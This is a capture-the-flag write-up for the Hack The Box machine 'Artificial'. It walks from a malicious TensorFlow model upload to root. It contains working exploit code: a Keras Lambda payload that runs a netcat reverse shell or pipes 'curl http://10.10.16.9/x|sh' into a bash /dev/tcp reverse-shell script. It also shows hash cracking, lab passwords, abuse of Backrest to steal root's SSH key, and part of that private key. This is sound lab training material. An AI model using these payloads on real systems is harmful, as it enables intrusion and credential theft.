---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - TensorFlow
  - Docker
  - sqlite3
  - Hashes
  - Backrest
  - BCrypt
  - Hash
  - JohnTheRipper
  - Cracking
---

![](images/Artificial.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
- [Foothold](#Foothold)
    - [TensorFlow Remote Code Execution](#TensorFlow-Remote-Code-Execution)
    - [Setup the Docker Container](#Setup-the-Docker-Container)
    - [Preparing the Exploit](#Preparing-the-Exploit)
- [Enumeration (app)](#Enumeration-app)
- [Privilege Escalation to gael](#Privilege-Escalation-to-gael)
- [user.txt](#usertxt)
- [Enumeration (gael)](#Enumeration-gael)
- [Getting Access to Backrest](#Getting-Access-to-Backrest)
    - [Cracking Hash with John the Ripper](#Cracking-Hash-with-John-the-Ripper)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [Backrest Misconfiguration](#Backrest-Misconfiguration)
- [root.txt](#roottxt)

## Summary

The `Foothold` for the box comes from a vulnerability in `TensorFlow` which is part of the `Web Application` running on port `80/TCP`, that allows a `malicious model` to achieve `Remote Code Execution (RCE)`. After getting a shell as a low-privileged user the underlying `sqlite3 Database` can be parsed to get the hash of the user which holds the `user.txt`. The `hash` was already cracked and the password could be retrieved from services like `crackstation.net`. This user is part of the `sysadm` group which has created a `Backup Archive` that contains a `password` which was encrypted using `BCrypt`. After formatting the `encrypted password` correctly, `John the Ripper` can be used for cracking it. The `password` then gives access to the `Backrest` application running locally on port `9898/TCP`. By `misconfiguring` the application files stored within `/root` can be `exfiltrated` which allows to steal the `SSH Private Key` of `root`.

## Reconnaissance

### Port Scanning

The box offered only port `22/TCP` and port `80/TCP` after the initial `port scan` using `Nmap`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.34.5                               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 09:44 CEST
Nmap scan report for 10.129.34.5
Host is up (0.054s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.13 seconds
```

We immediately spotted the `redirect` to `artificial.htb` and added it to our `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.34.5     artificial.htb
```

### Enumeration of Port 80/TCP

The web application was themed around `Artificial Intelligence (AI)` using the `TensorFlow` framework.

- [http://artificial.htb/](http://artificial.htb/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://artificial.htb/
http://artificial.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.34.5], Script, Title[Artificial - AI Solutions], nginx[1.18.0]
```

![](images/2025-06-23_09-50_80_website.png)

![](images/2025-06-23_09-51_80_website_tensorflow.png)

On the website we also found options to `register`and `login`. We created a user and logged in.

![](images/2025-06-23_09-52_80_website_register.png)

![](images/2025-06-23_09-53_80_website_login.png)

After our successful login we got greeted with an `upload form` for `TensorFlow Models` and a `Hyperlink` to the `Dockerfile` on which the application was build.

![](images/2025-06-23_09-53_80_website_upload.png)

## Foothold

### TensorFlow Remote Code Execution

We downloaded the `Dockerfile` and found the `version` of `TensorFlow` which was used on the application.

- [http://artificial.htb/static/Dockerfile](http://artificial.htb/static/Dockerfile)

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ cat Dockerfile 
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

| Version |
| ------- |
| 2.13.1  |

The version suffered from a `Remote Code Execution (RCE)` vulnerability described on various blogs. In one of them we found a nearly ready to fire `Proof of Concept (PoC)` exploit we modified slightly to our needs.

- [https://markaicode.com/tensorflow-security-vulnerability-fix/](https://markaicode.com/tensorflow-security-vulnerability-fix/)
- [https://mastersplinter.work/research/tensorflow-rce/](https://mastersplinter.work/research/tensorflow-rce/)

```shell
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6666 >/tmp/f")
    return x

lambdaLayer = tf.keras.layers.Lambda(exploit, name="output")

original = tf.keras.applications.vgg16.VGG16()
original.summary()

inp = original.input
original.layers.pop()

infected = tf.keras.models.Model(inp, lambdaLayer(original.layers[-1].output))

for layer in infected.layers:
    layer.trainable = False
    
infected.summary()
infected.save("infected.h5")

```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ cat shell.py 
import tensorflow as tf

def exploit(x):
    import os
    os.system("curl http://10.10.16.9/x|sh")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("shell.h5")
```

### Setup the Docker Container

Next we spun up the `Container` exposing a share on which we could exchange files between the `instance` and our local `machine`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ sudo docker build . -t artificial
[+] Building 67.7s (8/8) FINISHED                                                                                                                                                                                            docker:default
 => [internal] load build definition from Dockerfile                                                                                                                                                                                   0.0s
 => => transferring dockerfile: 496B                                                                                                                                                                                                   0.0s 
 => [internal] load metadata for docker.io/library/python:3.8-slim                                                                                                                                                                     1.8s 
 => [internal] load .dockerignore                                                                                                                                                                                                      0.0s
 => => transferring context: 2B                                                                                                                                                                                                        0.0s 
 => [1/4] FROM docker.io/library/python:3.8-slim@sha256:1d52838af602b4b5a831beb13a0e4d073280665ea7be7f69ce2382f29c5a613f                                                                                                               5.1s 
 => => resolve docker.io/library/python:3.8-slim@sha256:1d52838af602b4b5a831beb13a0e4d073280665ea7be7f69ce2382f29c5a613f                                                                                                               0.1s
 => => sha256:302e3ee498053a7b5332ac79e8efebec16e900289fc1ecd1c754ce8fa047fcab 29.13MB / 29.13MB                                                                                                                                       0.7s 
 => => sha256:a3f1dfe736c5f959143f23d75ab522a60be2da902efac236f4fb2a153cc14a5d 14.53MB / 14.53MB                                                                                                                                       0.4s
 => => sha256:1d52838af602b4b5a831beb13a0e4d073280665ea7be7f69ce2382f29c5a613f 10.41kB / 10.41kB                                                                                                                                       0.0s
 => => sha256:314bc2fb0714b7807bf5699c98f0c73817e579799f2d91567ab7e9510f5601a5 1.75kB / 1.75kB                                                                                                                                         0.0s 
 => => sha256:b5f62925bd0f63f48cc8acd5e87d0c3a07e2f229cd2fb0a9586e68ed17f45ee3 5.25kB / 5.25kB                                                                                                                                         0.0s 
 => => sha256:030d7bdc20a63e3d22192b292d006a69fa3333949f536d62865d1bd0506685cc 3.51MB / 3.51MB                                                                                                                                         0.5s 
 => => sha256:3971691a363796c39467aae4cdce6ef773273fe6bfc67154d01e1b589befb912 248B / 248B                                                                                                                                             0.6s
 => => extracting sha256:302e3ee498053a7b5332ac79e8efebec16e900289fc1ecd1c754ce8fa047fcab                                                                                                                                              2.1s
 => => extracting sha256:030d7bdc20a63e3d22192b292d006a69fa3333949f536d62865d1bd0506685cc                                                                                                                                              0.2s
 => => extracting sha256:a3f1dfe736c5f959143f23d75ab522a60be2da902efac236f4fb2a153cc14a5d                                                                                                                                              1.1s
 => => extracting sha256:3971691a363796c39467aae4cdce6ef773273fe6bfc67154d01e1b589befb912                                                                                                                                              0.0s
 => [2/4] WORKDIR /code                                                                                                                                                                                                                1.2s
 => [3/4] RUN apt-get update &&     apt-get install -y curl &&     curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_  11.7s
 => [4/4] RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl                                                                                                                            38.7s 
 => exporting to image                                                                                                                                                                                                                 8.8s 
 => => exporting layers                                                                                                                                                                                                                8.5s 
 => => writing image sha256:51f0e839c63500c5d45e4ff166a1e552e1b81740c4dd4b7f479e3ae1738ac222                                                                                                                                           0.0s 
 => => naming to docker.io/library/artificial
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ sudo docker run -it -v /media/sf_cybersecurity/notes/HTB/Machines/Artificial/files:/root/ -d artificial
c393c85fe00a139f7a9de7d730c853553c012814c8d72bbdb2a3c353b87f0db8
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ sudo docker exec -it c393c85fe00a139f7a9de7d730c853553c012814c8d72bbdb2a3c353b87f0db8 /bin/bash        
root@c393c85fe00a:/code#
```

### Preparing the Exploit

Inside the container we ran the script which provided us the `shell.h5` file containing our payload ready to be uploaded on the web application.

```shell
root@c393c85fe00a:~# python3 shell.py 
2025-06-23 08:25:58.887103: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
curl: (7) Failed to connect to 10.10.16.9 port 80 after 0 ms: Couldn't connect to server
/usr/local/lib/python3.8/site-packages/keras/src/engine/training.py:3000: UserWarning: You are saving your model as an HDF5 file via `model.save()`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. `model.save('my_model.keras')`.
  saving_api.save_model(
```

Then we prepared the `file` containing the `payload` as well as the `local web server`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/serve]
└─$ cat x 
#!/bin/bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.16.9/6666 0>&1'
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We uploaded the `.h5` file and clicked on `View Predicitons` in order to trigger the `payload`.

![](images/2025-06-23_09-58_80_website_uloaded_model.png)

We got a `hit` on our `web server`...

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.34.5 - - [23/Jun/2025 10:28:40] "GET /x HTTP/1.1" 200 -
```

... and a `callback` on our `listener`!

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.16.9] from (UNKNOWN) [10.129.34.5] 37074
bash: cannot set terminal process group (940): Inappropriate ioctl for device
bash: no job control in this shell
app@artificial:~/app$
```

After a little bit of `stabilizing` our `shell environment` we moved on with the `enumeration` of the user `app`.

```shell
app@artificial:~/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'

python3 -c 'import pty;pty.spawn("/bin/bash")'

app@artificial:~/app$ 
app@artificial:~/app$ ^Z
zsh: suspended  nc -lnvp 6666
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 6666

app@artificial:~/app$ 
app@artificial:~/app$ export XTERM=xterm
app@artificial:~/app$
```

## Enumeration (app)

First step was to perform the typical tasks which showed us another user called `gael`.

```shell
app@artificial:~/app$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```

```shell
app@artificial:~/app$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
gael:x:1000:1000:gael:/home/gael:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false
```

| Username |
| -------- |
| gael     |

Then we checked our `landing directory` for interesting files which could potentially contain `credentials`.

```shell
app@artificial:~/app$ find .
.
./instance
./instance/users.db
./app.py
./models
./static
./static/requirements.txt
./static/css
./static/css/styles.css
./static/Dockerfile
./static/js
./static/js/scripts.js
./templates
./templates/login.html
./templates/run_model.html
./templates/dashboard.html
./templates/index.html
./templates/register.html
./__pycache__
./__pycache__/app.cpython-38.pyc
```

## Privilege Escalation to gael

And indeed we found an `sqlite3` database which contained `hashes` for a few users.

```shell
app@artificial:~/app$ strings ./instance/users.db
SQLite format 3
itablemodelmodel
CREATE TABLE model (
        id VARCHAR(36) NOT NULL, 
        filename VARCHAR(120) NOT NULL, 
        user_id INTEGER NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
indexsqlite_autoindex_model_1model
tableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(100) NOT NULL, 
        email VARCHAR(120) NOT NULL, 
        password VARCHAR(200) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email)
indexsqlite_autoindex_user_2user
indexsqlite_autoindex_user_1user
+Masdfasdf@asdf.local912ec803b2ce49e4a541068d495ab570>
3Mfoobarfoobar@foobar.local3858f62230ac3c915f300c664312c63f<
3Mmarymary@artificial.htbbf041041e57f1aff3be7ea1abd6129d0>
5Mroyerroyer@artificial.htbbc25b1f80f544c0ab451c02a3dca9fc6@
7Mrobertrobert@artificial.htbb606c5f5136170f15444251665638b36<
3Mmarkmark@artificial.htb0f3d8c76530022670f1c6029eed09ccb<
3Mgaelgael@artificial.htbc99175974b6e192936d97224638a34f8
asdf
foobar
mary
royer
robert
mark
        gael
asdf@asdf.local
foobar@foobar.local
mary@artificial.htb
royer@artificial.htb
robert@artificial.htb
mark@artificial.htb
3       gael@artificial.htb
43dbf0f2-f686-46a1-9288-0e1ff93f09cb43dbf0f2-f686-46a1-9288-0e1ff93f09cb.h5
U       43dbf0f2-f686-46a1-9288-0e1ff93f09cb
```

We were mainly interested in the one for `gael` and found it already cracked on `crackstation.net`.

- [https://crackstation.net/](https://crackstation.net/.)

| Password          |
| ----------------- |
| mattp005numbertwo |

This lead us to access via `SSH` for `gael` and to the `user.txt`.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh gael@artificial.htb
The authenticity of host 'artificial.htb (10.129.34.5)' can't be established.
ED25519 key fingerprint is SHA256:RfqGfdDw0WXbAPIqwri7LU4OspmhEFYPijXhBj6ceHs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'artificial.htb' (ED25519) to the list of known hosts.
gael@artificial.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 23 Jun 2025 08:33:13 AM UTC

  System load:           0.02
  Usage of /:            58.5% of 7.53GB
  Memory usage:          29%
  Swap usage:            0%
  Processes:             240
  Users logged in:       0
  IPv4 address for eth0: 10.129.34.5
  IPv6 address for eth0: dead:beef::250:56ff:fe94:5266


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jun 23 08:33:14 2025 from 10.10.16.9
gael@artificial:~$
```

## user.txt

```shell
gael@artificial:~$ cat user.txt 
e8e9b775018b09486b3d115f350f700b
```

## Enumeration (gael)

On `gael` of course we performed the same checks as usual and actually figured out that the user was part of a `non-standard group` called `sysadm`.

```shell
gael@artificial:~$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

```shell
gael@artificial:~$ sudo -l
[sudo] password for gael: 
Sorry, user gael may not run sudo on artificial.
```

By checking `/opt` we found an `external application` called `backrest` installed.

```shell
gael@artificial:~$ ls -la /opt/
total 12
drwxr-xr-x  3 root root 4096 Mar  4 22:19 .
drwxr-xr-x 18 root root 4096 Mar  3 02:50 ..
drwxr-xr-x  5 root root 4096 Jun 23 08:30 backrest
```

```shell
gael@artificial:/opt/backrest$ ls -la
total 51116
drwxr-xr-x 5 root root         4096 Jun 23 08:30 .
drwxr-xr-x 3 root root         4096 Mar  4 22:19 ..
-rwxr-xr-x 1 app  ssl-cert 25690264 Feb 16 19:38 backrest
drwxr-xr-x 3 root root         4096 Mar  3 21:27 .config
-rwxr-xr-x 1 app  ssl-cert     3025 Mar  3 04:28 install.sh
-rw------- 1 root root           64 Mar  3 21:18 jwt-secret
-rw-r--r-- 1 root root        77824 Jun 23 08:30 oplog.sqlite
-rw------- 1 root root            0 Mar  3 21:18 oplog.sqlite.lock
-rw-r--r-- 1 root root        32768 Jun 23 08:30 oplog.sqlite-shm
-rw-r--r-- 1 root root            0 Jun 23 08:30 oplog.sqlite-wal
drwxr-xr-x 2 root root         4096 Mar  3 21:18 processlogs
-rwxr-xr-x 1 root root     26501272 Mar  3 04:28 restic
drwxr-xr-x 3 root root         4096 Jun 23 08:30 tasklogs
```

- [https://github.com/garethgeorge/backrest](https://github.com/garethgeorge/backrest)

Based on the information of the `repository` we had a quick look at the `ports` available `locally`. Port `9898/TCP` was indeed open.

```shell
gael@artificial:/opt/backrest$ ss -tulpn
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                   
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                              0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        2048                                           127.0.0.1:5000                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:9898                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*                                                
tcp                     LISTEN                   0                        511                                                 [::]:80                                                 [::]:*
```

Next we searched for interesting files of the `sysadm` group just to find a `backup archive` which we downloaded to our local machine for further investigation.

```shell
gael@artificial:~$ find / -group sysadm 2>/dev/null
/var/backups/backrest_backup.tar.gz
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ scp gael@artificial.htb://var/backups/backrest_backup.tar.gz .
gael@artificial.htb's password: 
backrest_backup.tar.gz
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ tar -xvf backrest_backup.tar.gz 
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh
```

In the `config.json` then we found a `username` and a `encrypted password`. For the `encryption` of the password, `BCrypt` was used.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ cat backrest/.config/backrest/config.json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

## Getting Access to Backrest

Before we went down a potential rabbit hole we forwarded port `9898/TCP` to our local machine in order to access the `backrest` application.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh -L 9898:localhost:9898 gael@artificial.htb
gael@artificial.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 23 Jun 2025 08:41:34 AM UTC

  System load:           0.08
  Usage of /:            58.6% of 7.53GB
  Memory usage:          34%
  Swap usage:            0%
  Processes:             240
  Users logged in:       0
  IPv4 address for eth0: 10.129.34.5
  IPv6 address for eth0: dead:beef::250:56ff:fe94:5266


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Jun 23 08:41:35 2025 from 10.10.16.9
gael@artificial:~$
```

And of course we got prompted with a `login form`.

- [http://127.0.0.1:9898/](http://127.0.0.1:9898/)

![](images/2025-06-23_10-42_9898_backrest_login.png)

### Cracking Hash with John the Ripper

In order to `crack` the `hash` using `John the Ripper` was put it in `Base64` encoded format and saved it to a file.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d > backrest_root.b64
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ cat backrest_root.b64 
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

And with this preparation `John the Ripper` was able to `crack the password` in short time.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Artificial/files]
└─$ sudo john backrest_root.b64                                            
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
!@#$%^           (?)     
1g 0:00:00:24 DONE 2/3 (2025-06-23 10:46) 0.04020g/s 140.4p/s 140.4c/s 140.4C/s !@#$%..Sverige
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Username      | Password |
| ------------- | -------- |
| backrest_root | !@#$%^   |

![](images/2025-06-23_10-47_9898_backrest_dashboard.png)

## Privilege Escalation to root

### Backrest Misconfiguration

Now with access to the `Backrest` application we first created a `Repository` located at `/dev/shm` in order to store the files we were going to backup.

![](images/2025-06-23_10-48_9898_backrest_repository_configuration.png)

As second step we configured the corresponding `Plan` pointing to the desired file of `id_rsa` located within `/root/.ssh/`.

![](images/2025-06-23_10-52_9898_backrest_plan_configuration.png)

As last step with clicked on `Backup Now` to run the plan and backup the files into our repository.

![](images/2025-06-23_10-53_9898_backrest_running_backup.png)

To access the files we needed to get familiar with the `Run Command` option and the `syntax`.

![](images/2025-06-23_11-06_9898_backrest_running_commands.png)

After the job finished we checked if the desired file was actually part of the backup.

![](images/2025-06-23_11-13_9898_backrest_backups.png)

![](images/2025-06-23_11-15_9898_backrest_snapshot_browser.png)

Then we grabbed the `Snapshot ID` of the previously created backup to `dump` the `SSH Private Key` out of it.

```shell
dump c7bc3d43 /root/.ssh/id_rsa
```

![](images/2025-06-23_11-16_9898_backrest_restore.png)

![](images/2025-06-23_11-22_9898_backrest_ssh_key_restored.png)

```shell
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA5dXD22h0xZcysyHyRfknbJXk5O9tVagc1wiwaxGDi+eHE8vb5/Yq
2X2jxWO63SWVGEVSRH61/1cDzvRE2br3GC1ejDYfL7XEbs3vXmb5YkyrVwYt/G/5fyFLui
NErs1kAHWBeMBZKRaSy8VQDRB0bgXCKqqs/yeM5pOsm8RpT/jjYkNdZLNVhnP3jXW+k0D1
Hkmo6C5MLbK6X5t6r/2gfUyNAkjCUJm6eJCQgQoHHSVFqlEFWRTEmQAYjW52HzucnXWJqI
4qt2sY9jgGo89Er72BXEfCzAaglwt/W1QXPUV6ZRfgqSi1LmCgpVQkI9wcmSWsH1RhzQj/
MTCSGARSFHi/hr3+M53bsmJ3zkJx0443yJV7P9xjH4I2kNWgScS0RiaArkldOMSrIFymhN
xI4C2LRxBTv3x1mzgm0RVpXf8dFyMfENqlAOEkKJjVn8QFg/iyyw3XfOSJ/Da1HFLJwDOy
1jbuVzGf9DnzkYSgoQLDajAGyC8Ymx6HVVA49THRAAAFiIVAe5KFQHuSAAAAB3NzaC1yc2
EAAAGBAOXVw9todMWXMrMh8kX5J2yV5OTvbVWoHNcIsGsRg4vnhxPL2+f2Ktl9o8Vjut0l
lRhFUkR+tf9XA870RNm69xgtXow2Hy+1xG7N715m+WJMq1cGLfxv+X8hS7ojRK7NZAB1gX
jAWSkWksvFUA0QdG4FwiqqrP8njOaTrJvEaU/442JDXWSzVYZz9411vpNA9R5JqOguTC2y
ul+beq/9oH1MjQJIwlCZuniQkIEKBx0lRapRBVkUxJkAGI1udh87nJ11iaiOKrdrGPY4Bq
PPRK+9gVxHwswGoJcLf1tUFz1FemUX4KkotS5goKVUJCPcHJklrB9UYc0I/zEwkhgEUhR4
v4a9/jOd27Jid85CcdOON8iVez/cYx+CNpDVoEnEtEYmgK5JXTjEqyBcpoTcSOAti0cQU7
98dZs4JtEVaV3/HRcjHxDapQDhJCiY1Z/EBYP4sssN13zkifw2tRxSycAzstY27lcxn/Q5
85GEoKECw2owBsgvGJseh1VQOPUx0QAAAAMBAAEAAAGAKpBZEkQZBBLJP+V0gcLvqytjVY
aFwAw/Mw+X5Gw86Wb6XA8v7ZhoPRkIgGDE1XnFT9ZesvKob95EhUo1igEXC7IzRVIsmmBW
PZMD1n7JhoveW2J4l7yA/ytCY/luGdVNxMv+K0er+3EDxJsJBTJb7ZhBajdrjGFdtcH5gG
tyeW4FZkhFfoW7vAez+82neovYGUDY+A7C6t+jplsb8IXO+AV6Q8cHvXeK0hMrv8oEoUAq
